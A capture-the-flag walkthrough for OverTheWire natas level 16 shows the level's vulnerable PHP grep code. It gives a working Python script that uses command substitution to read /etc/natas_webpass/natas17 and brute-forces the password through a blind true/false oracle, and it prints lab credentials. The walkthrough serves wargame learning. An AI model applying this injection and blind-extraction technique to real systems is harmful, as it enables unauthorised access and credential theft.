---
title: natas 16 walkthrough
description: over the wire natas 16
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-16 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 16 walkthrough
    order: 30
---
## Description
> Username: natas16
> 
> URL:      http://natas16.natas.labs.overthewire.org
### Source Code
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

---
## Progress
### Observation
Some characters are filtered. Our payload should contain `/etc/natas_webpass/natas17` in order to interact with the password.
### Payload
QQ
### Program
```python
import requests
from bs4 import BeautifulSoup

def request_with_password(password : str) -> bool:
    payload = f"?needle=$(grep ^{password} /etc/natas_webpass/natas17)&submit=Search"
    return request_with_payload(payload)

def request_with_payload(payload: str):
    header = {
        "Authorization" : "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==",
    }
    url = "http://natas16.natas.labs.overthewire.org/"
    url += payload
    response = requests.get(url, headers=header)
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('pre')
    return "African" not in content.__str__()

def main():
    success_password = ""
    letters = 'abcdefghijklmnopqrstuvwxyz'
    candidates = letters + letters.upper() + "0123456789"
    while True:
        for candidate in candidates:
            if request_with_password(success_password + candidate):
                success_password += candidate
                print(success_password)
                break
        else:
            print(f"password : {success_password}")
            break

main()
```
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 
### Tools
- [[grep]]